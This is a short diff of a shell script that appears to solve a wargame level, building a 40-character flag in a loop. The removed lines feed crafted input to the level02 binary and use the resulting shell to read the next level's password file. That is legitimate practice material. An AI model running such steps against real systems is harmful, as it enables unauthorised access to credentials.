@@ -20,11 +20,4 @@ while [ $i -lt 100 ] && [ ${#flag} -ne 40 ]; do
     i=$[$i+1]
 done
 
-echo -e "\nNext pass should be: $flag"
-
-echo -e "AAA\n$flag" > /tmp/exploit02
-
-(cat /tmp/exploit02 - | ~/level02) << EOI
-    echo "\nwhoami: \$(whoami)"
-    echo "Next pass is:  \$(cat /home/users/level03/.pass)"
-EOI
+echo -e "\nNext pass is:  $flag"
